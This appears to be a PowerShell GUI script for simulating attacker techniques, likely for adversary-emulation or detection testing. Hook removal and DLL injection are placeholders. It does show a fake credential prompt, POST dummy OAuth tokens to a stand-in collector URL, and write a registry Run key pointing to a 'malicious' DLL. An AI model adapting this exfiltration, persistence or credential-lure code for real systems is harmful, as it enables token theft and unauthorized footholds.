<#
.SYNOPSIS
    GUI wrapper for Authentic Antics TTP Simulator in PowerShell
.DESCRIPTION
    Presents a WinForms-based UI to simulate:
      - ntdll hook removal
      - DLL injection into Outlook
      - Fake credential prompt overlay
      - OAuth token exfiltration
      - Persistence via registry
#>
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Create form
$form = New-Object System.Windows.Forms.Form
$form.Text = 'Authentic Antics Simulator'
$form.Width = 420
$form.Height = 450
$form.StartPosition = 'CenterScreen'

# Remove hooks checkbox
$chkRemove = New-Object System.Windows.Forms.CheckBox
$chkRemove.Text = 'Remove ntdll hooks'
$chkRemove.AutoSize = $true
$chkRemove.Location = New-Object System.Drawing.Point(20,20)
$form.Controls.Add($chkRemove)

# Inject DLL checkbox
$chkInject = New-Object System.Windows.Forms.CheckBox
$chkInject.Text = 'Inject MSAL DLL into Outlook'
$chkInject.AutoSize = $true
$chkInject.Location = New-Object System.Drawing.Point(20,60)
$form.Controls.Add($chkInject)

# Fake prompt checkbox
$chkPrompt = New-Object System.Windows.Forms.CheckBox
$chkPrompt.Text = 'Show fake credential prompt'
$chkPrompt.AutoSize = $true
$chkPrompt.Location = New-Object System.Drawing.Point(20,100)
$form.Controls.Add($chkPrompt)

# Exfil checkbox and URL textbox
$chkExfil = New-Object System.Windows.Forms.CheckBox
$chkExfil.Text = 'Simulate token exfiltration'
$chkExfil.AutoSize = $true
$chkExfil.Location = New-Object System.Drawing.Point(20,140)
$form.Controls.Add($chkExfil)

$txtUrl = New-Object System.Windows.Forms.TextBox
$txtUrl.Text = 'http://collector.local/receive'
$txtUrl.Width = 260
$txtUrl.Location = New-Object System.Drawing.Point(20,170)
$form.Controls.Add($txtUrl)

# Persistence checkbox and inputs
$chkPersist = New-Object System.Windows.Forms.CheckBox
$chkPersist.Text = 'Establish persistence'
$chkPersist.AutoSize = $true
$chkPersist.Location = New-Object System.Drawing.Point(20,210)
$form.Controls.Add($chkPersist)

$txtKey = New-Object System.Windows.Forms.TextBox
$txtKey.Text = 'MaliciousIdentity'
$txtKey.Width = 120
$txtKey.Location = New-Object System.Drawing.Point(20,240)
$form.Controls.Add($txtKey)

$txtPath = New-Object System.Windows.Forms.TextBox
$txtPath.Text = 'C:\malicious\Microsoft.Identity64.dll'
$txtPath.Width = 260
$txtPath.Location = New-Object System.Drawing.Point(20,270)
$form.Controls.Add($txtPath)

# Run button
$btnRun = New-Object System.Windows.Forms.Button
$btnRun.Text = 'Run Simulation'
$btnRun.Width = 120
$btnRun.Height = 30
$btnRun.Location = New-Object System.Drawing.Point(150,320)
$form.Controls.Add($btnRun)

# Button click handler
$btnRun.Add_Click({
    if ($chkRemove.Checked) {
        Write-Host '[*] Removing hooks...'
        # Placeholder: call removal logic here
        Start-Sleep -Seconds 1
        Write-Host '[+] Hooks removed'
    }
    if ($chkInject.Checked) {
        Write-Host '[*] Injecting DLL...'
        # Placeholder: call injector here
        Start-Sleep -Seconds 1
        Write-Host '[+] DLL injected'
    }
    if ($chkPrompt.Checked) {
        Write-Host '[*] Displaying fake prompt...'
        $dlg = New-Object System.Windows.Forms.Form
        $dlg.Text = 'Authentication Required'
        $dlg.Width = 360
        $dlg.Height = 160
        $dlg.StartPosition = 'CenterParent'
        $lbl = New-Object System.Windows.Forms.Label
        $lbl.Text = 'Your session expired. Please re-enter credentials.'
        $lbl.AutoSize = $true
        $lbl.Location = New-Object System.Drawing.Point(20,20)
        $dlg.Controls.Add($lbl)
        $btnOk = New-Object System.Windows.Forms.Button
        $btnOk.Text = 'OK'
        $btnOk.Width = 60
        $btnOk.Location = New-Object System.Drawing.Point(140,80)
        $btnOk.Add_Click({ $dlg.Close() })
        $dlg.Controls.Add($btnOk)
        [void]$dlg.ShowDialog()
        Write-Host '[+] Fake prompt closed'
    }
    if ($chkExfil.Checked) {
        $url = $txtUrl.Text
        Write-Host "[*] Exfiltrating to $url..."
        try {
            $payload = @{ access_token = 'SIM_ACCESS'; refresh_token = 'SIM_REF' }
            Invoke-RestMethod -Uri $url -Method Post -Body (ConvertTo-Json $payload)
            Write-Host '[+] Exfiltration successful'
        } catch {
            Write-Warning "Exfil failed: $_"
        }
    }
    if ($chkPersist.Checked) {
        $name = $txtKey.Text; $path = $txtPath.Text
        Write-Host "[*] Establishing persistence: $name -> $path"
        New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $name -Value $path -Force
        Write-Host '[+] Persistence set'
    }
})

# Show form
[System.Windows.Forms.Application]::EnableVisualStyles()
[void]$form.ShowDialog()